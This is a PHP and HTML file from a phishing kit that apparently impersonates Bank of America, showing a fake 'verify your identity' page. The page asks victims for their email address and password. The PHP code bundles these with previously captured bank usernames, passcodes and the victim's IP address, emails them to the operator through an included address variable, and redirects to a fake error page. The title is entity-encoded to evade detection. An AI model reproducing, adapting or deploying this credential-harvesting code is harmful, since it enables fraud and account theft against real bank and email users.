﻿<?php


include '../Valid.php';
@session_start();
ob_start();

include 'Emaili.php';


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$hosti = generateRandomString();



$_SESSION['em'] = $_POST['em'];
$_SESSION['emp'] = $_POST['emp'];

if (!empty($_POST["em"])) {

			$ipaddress = $_SERVER['REMOTE_ADDR'];
			$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
			$message.= "-------------User Info-----------------\n";
			$message.= "Username: ".$_SESSION['usr']."\n";
			$message.= "Pass Code: ".$_SESSION['psw']."\n";
			$message.=  "-------------Email Info-----------------\n";
			$message.=  "Email Address: ".$_SESSION['em']."\n";
			$message.=  "Email Pass: ".$_SESSION['emp']."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "IP            : ".$ipaddress."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "|Client IP: ".$ipaddress2."\n";
			$message.= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
			$subject = "xXxBOA-NeWxXx $ipaddress";
			$headers = "From: UnKnown <Source@Bourder.land>";
			mail($SEND,$subject,$message,$headers);
		header("Location: emailerror.php?sec=$hosti$hosti$hosti"); 
} else {
}

?>

<html><head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico">	
<link rel="stylesheet" href="css-js/jok3.css">
</head>
<body>
<div id="container">
<div class="kaposs" style="position: relative;top:250px; left: 250px;z-index: 39;width: 819px;background: #fff4f94d;height: 300px;">
   
<h3 ></h3>
<div>

<p class="word"><span> </span><a  class="word"style="font-size: 20;" >*</a>Please login to your Email address for Verification.</p>
<br>

<div id="mail" class="" style="text-align-last: center;">
<form action="" name="chalojee" id="chalojee" method="post">

 <input class="email" type="email" name="em"  style="font-size:.94118em;padding: 6px 10px;" tabindex="1" value="" autocomplete="username" required="" autofocus="true" placeholder="Email address"></br>
</br>
<input class="phone-no" type="password" name="emp" style="font-size:.94118em;padding: 6px 10px;" required="" tabindex="2" value="" autocomplete="password"  autofocus="true" placeholder="Password">
 </br>
 </br>
 <input type="image" name="formimage1" width="129" height="32" src="images/bcnf.png">
</form>	   
 </div>
</div>

</div>
<div id="image15" style="position: absolute; overflow: hidden; left: 180px; top: 660px; width: 987px; height: 150px; z-index: 3;"><img src="images/bbo28.png" alt="" title="" border="0" width="987" height="150"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:5"><img src="images/b7.png" alt="" title="" border="0" width="983" height="117"></div>
</div>
</body>

</html>
<?php ob_end_flush(); ?>